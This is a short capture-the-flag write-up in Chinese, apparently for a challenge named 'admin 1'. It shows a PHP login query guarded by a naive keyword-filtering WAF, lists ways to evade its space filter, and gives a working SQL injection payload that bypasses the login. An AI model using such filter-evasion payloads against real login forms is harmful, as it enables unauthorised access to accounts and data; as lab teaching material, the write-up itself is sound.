admin 1
===

```PHP
//WAF
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, ' ') || strstr($strl, '1=1') || strstr($strl, "''") ||
        strstr($strl, 'union select') || strstr($strl, 'select ')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}
// Injection Code
$sql = sprintf("SELECT * FROM `%s` WHERE `name` = '%s' AND `password` = '%s'",
        USER_TABLE,
        $_POST['name'],
        $_POST['password']
);
```
Admin1 與 Admin0 的差別僅有 WAF 增加過濾，並且把最重要的空白給過濾掉了，同時也無法使用 select 套餐。

空白可以藉由以下來3種方式來 bypass。
`--`、`/**/`、`;%00`

Payload
```
\'/**/or/**/1/**/=/**/1/**/limit/**/1,1/**/#
```

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)